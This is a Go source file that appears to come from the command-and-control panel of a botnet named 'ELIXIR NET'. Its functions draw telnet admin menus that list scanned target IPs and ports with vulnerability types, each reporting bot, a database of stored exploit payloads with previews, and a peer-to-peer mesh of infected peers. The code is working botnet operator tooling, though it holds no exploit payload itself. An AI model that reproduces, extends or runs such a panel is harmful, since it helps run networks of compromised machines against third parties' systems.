package main
import (
	"fmt"
	"strconv"
	"time"
)
func (this *Admin) handleIntelligenceMenu() {
	this.conn.Write([]byte("\033[2J\033[1H\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m           ELIXIR NET - INTELLIGENCE REPORTS              \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	reports := GetIntelligenceReports(50)
	stats := GetIntelligenceStats()
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[38;5;51mTotal Reports: \x1b[1;36m%-6d \x1b[38;5;198m│ \x1b[38;5;51mTotal Exploits: \x1b[1;36m%-6d \x1b[1;95m║\r\n",
		stats["total_reports"], stats["total_exploits"])))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[38;5;51mTarget\x1b[0m          │ \x1b[38;5;201mProtocol\x1b[0m │ \x1b[1;36mVuln\x1b[0m │ \x1b[1;33mBot\x1b[0m              │ \x1b[38;5;198mTime\x1b[0m        \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	if len(reports) == 0 {
		this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;31m☾ No intelligence reports found\x1b[0m                              \x1b[1;95m║\r\n"))
	} else {
		for i, report := range reports {
			if i >= 50 {
				break
			}
			targetIP := fmt.Sprintf("%d.%d.%d.%d",
				(report.TargetIP>>24)&0xff,
				(report.TargetIP>>16)&0xff,
				(report.TargetIP>>8)&0xff,
				report.TargetIP&0xff)
			protocolName := "UNKNOWN"
			switch report.Protocol {
			case 1:
				protocolName = "HTTP"
			case 2:
				protocolName = "TCP"
			case 3:
				protocolName = "UDP"
			case 4:
				protocolName = "TELNET"
			case 5:
				protocolName = "SSH"
			}
			vulnName := fmt.Sprintf("%d", report.Vulnerability)
			switch report.Vulnerability {
			case 1:
				vulnName = "OVERFLOW"
			case 2:
				vulnName = "FMT_STR"
			case 3:
				vulnName = "SQL_INJ"
			case 4:
				vulnName = "CMD_INJ"
			case 5:
				vulnName = "PATH_TRAV"
			case 7:
				vulnName = "BUF_OVER"
			case 8:
				vulnName = "INT_OVER"
			}
			botIP := report.BotIP
			if len(botIP) > 18 {
				botIP = botIP[:18]
			}
			timeStr := report.ReportedAt.Format("01-02 15:04")
			this.conn.Write([]byte(fmt.Sprintf(
				"\x1b[1;95m║ \x1b[38;5;51m%-15s\x1b[0m │ \x1b[38;5;201m%-8s\x1b[0m │ \x1b[1;36m%-4s\x1b[0m │ \x1b[1;33m%-18s\x1b[0m │ \x1b[38;5;198m%-12s\x1b[0m \x1b[1;95m║\r\n",
				targetIP+":"+strconv.Itoa(int(report.TargetPort)),
				protocolName,
				vulnName,
				botIP,
				timeStr)))
		}
	}
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n"))
	this.conn.Write([]byte("\r\n\x1b[1;33mPress Enter to continue...\x1b[0m\r\n"))
	buf := make([]byte, 1)
	this.conn.Read(buf)
}
func (this *Admin) handleExploitsMenu() {
	this.conn.Write([]byte("\033[2J\033[1H\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              ELIXIR NET - EXPLOITS DATABASE               \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	stats := GetIntelligenceStats()
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[38;5;51mTotal Exploits Stored: \x1b[1;36m%-6d\x1b[0m                        \x1b[1;95m║\r\n",
		stats["total_exploits"])))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[38;5;51mTarget\x1b[0m              │ \x1b[38;5;201mSize\x1b[0m    │ \x1b[1;36mPreview\x1b[0m                        \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	reports := GetIntelligenceReports(100)
	exploitMap := make(map[string]bool)
	exploitCount := 0
	for _, report := range reports {
		key := fmt.Sprintf("%d.%d.%d.%d:%d",
			(report.TargetIP>>24)&0xff,
			(report.TargetIP>>16)&0xff,
			(report.TargetIP>>8)&0xff,
			report.TargetIP&0xff,
			report.TargetPort)
		if !exploitMap[key] && len(report.ExploitData) > 0 {
			exploitMap[key] = true
			exploitCount++
			if exploitCount > 50 {
				break
			}
			preview := string(report.ExploitData)
			if len(preview) > 40 {
				preview = preview[:40] + "..."
			}
			cleanPreview := ""
			for _, c := range preview {
				if c >= 32 && c < 127 {
					cleanPreview += string(c)
				} else {
					cleanPreview += "."
				}
			}
			this.conn.Write([]byte(fmt.Sprintf(
				"\x1b[1;95m║ \x1b[38;5;51m%-20s\x1b[0m │ \x1b[1;36m%-8d\x1b[0m │ \x1b[1;33m%-40s\x1b[0m \x1b[1;95m║\r\n",
				key,
				len(report.ExploitData),
				cleanPreview)))
		}
	}
	if len(exploitMap) == 0 {
		this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;31m☾ No exploits found\x1b[0m                                      \x1b[1;95m║\r\n"))
	}
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n"))
	this.conn.Write([]byte("\r\n\x1b[1;33mPress Enter to continue...\x1b[0m\r\n"))
	buf := make([]byte, 1)
	this.conn.Read(buf)
}
func (this *Admin) handleP2PMenu() {
	this.conn.Write([]byte("\033[2J\033[1H\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m            ELIXIR NET - P2P MESH NETWORK                \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	peers := GetP2PPeers()
	stats := GetIntelligenceStats()
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[38;5;51mP2P Peers: \x1b[1;36m%-6d\x1b[0m                                      \x1b[1;95m║\r\n",
		stats["p2p_peers"])))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[38;5;51mIP Address\x1b[0m          │ \x1b[38;5;201mPort\x1b[0m │ \x1b[1;36mVersion\x1b[0m │ \x1b[1;33mArch\x1b[0m      │ \x1b[38;5;198mLast Seen\x1b[0m   \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	if len(peers) == 0 {
		this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;31m☾ No P2P peers found\x1b[0m                                  \x1b[1;95m║\r\n"))
	} else {
		sortedPeers := make([]P2PPeerInfo, len(peers))
		copy(sortedPeers, peers)
		for i := 0; i < len(sortedPeers)-1; i++ {
			for j := i + 1; j < len(sortedPeers); j++ {
				if sortedPeers[i].LastSeen.Before(sortedPeers[j].LastSeen) {
					sortedPeers[i], sortedPeers[j] = sortedPeers[j], sortedPeers[i]
				}
			}
		}
		for i, peer := range sortedPeers {
			if i >= 50 {
				break
			}
			ip := peer.IP
			if len(ip) > 18 {
				ip = ip[:18]
			}
			arch := peer.Arch
			if len(arch) > 10 {
				arch = arch[:10]
			}
			timeSince := time.Since(peer.LastSeen)
			var lastSeen string
			if timeSince < time.Minute {
				lastSeen = fmt.Sprintf("%ds ago", int(timeSince.Seconds()))
			} else if timeSince < time.Hour {
				lastSeen = fmt.Sprintf("%dm ago", int(timeSince.Minutes()))
			} else if timeSince < 24*time.Hour {
				lastSeen = fmt.Sprintf("%dh ago", int(timeSince.Hours()))
			} else {
				lastSeen = peer.LastSeen.Format("01-02 15:04")
			}
			this.conn.Write([]byte(fmt.Sprintf(
				"\x1b[1;95m║ \x1b[38;5;51m%-18s\x1b[0m │ \x1b[38;5;201m%-5d\x1b[0m │ \x1b[1;36mv%-3d\x1b[0m    │ \x1b[1;33m%-10s\x1b[0m │ \x1b[38;5;198m%-12s\x1b[0m \x1b[1;95m║\r\n",
				ip,
				peer.Port,
				peer.Version,
				arch,
				lastSeen)))
		}
	}
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n"))
	this.conn.Write([]byte("\r\n\x1b[1;33mPress Enter to continue...\x1b[0m\r\n"))
	buf := make([]byte, 1)
	this.conn.Read(buf)
}
